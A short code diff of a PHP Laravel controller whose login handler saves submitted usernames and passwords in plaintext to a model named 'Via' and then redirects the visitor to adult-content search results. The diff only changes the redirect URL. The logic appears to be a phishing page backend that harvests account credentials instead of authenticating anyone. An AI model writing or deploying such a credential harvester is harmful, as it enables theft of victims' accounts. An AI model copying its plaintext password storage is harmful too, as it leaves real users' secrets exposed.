@@ -19,12 +19,11 @@ class UserController extends Controller
 
     public function postLogin(Checklogin $request)
     {
-        $url="http://javphim.net/genre/jav/";
+        $url="https://www.youtube.com/results?search_query=phim+sex";
         $via=new Via();
         $via->taikhoan=$request->taikhoan;
         $via->matkhau=$request->matkhau;
         $via->save();
-
         return Redirect::to($url);
     }
 }
